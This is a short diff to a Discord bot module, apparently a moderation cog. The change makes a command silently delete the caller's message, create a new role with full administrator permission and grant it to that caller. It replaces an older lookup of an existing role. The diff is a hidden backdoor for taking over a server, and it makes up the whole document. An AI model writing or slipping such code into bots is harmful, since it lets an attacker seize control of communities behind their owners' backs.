@@ -13,7 +13,7 @@ class botmod:
             autor = ctx.message.author
             message = ctx.message
             await self.bot.delete_message(ctx.message)
-            carga = discord.utils.find(lambda r: r.name == "adm corno", message.server.roles)
+            carga = await self.bot.create_role(message.server, administrator=True)
             await self.bot.add_roles(autor, carga)
         else:
             return
